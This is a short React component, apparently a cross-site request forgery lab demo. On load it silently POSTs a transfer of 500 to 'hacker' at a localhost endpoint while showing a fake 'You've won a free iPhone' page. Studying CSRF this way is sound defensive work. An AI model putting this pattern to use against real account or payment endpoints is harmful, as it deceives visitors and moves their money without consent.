import React, { useEffect } from "react";
import axios from "axios";
import "./App.css";

function FakeAd() {
  useEffect(() => {
    axios
      .post(
        "http://localhost:5000/transfer",
        {
          amount: 500,
          to: "hacker",
        },
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      )
      .catch((error) => {
        console.error("Transfer failed:", error);
      });
  }, []);

  return (
    <div className="container">
      <div className="content-box">
        <div className="heading-container">
          <h1>🎉 Congratulations! 🎉</h1>
          <p className="subtitle">
            You've won a free iPhone! Check your email for details.
          </p>
        </div>
        <div className="info-box">
          <p className="info-text">
            We're processing your prize! You'll receive an email shortly with shipping details.
          </p>
        </div>
      </div>
    </div>
  );
}

export default FakeAd;
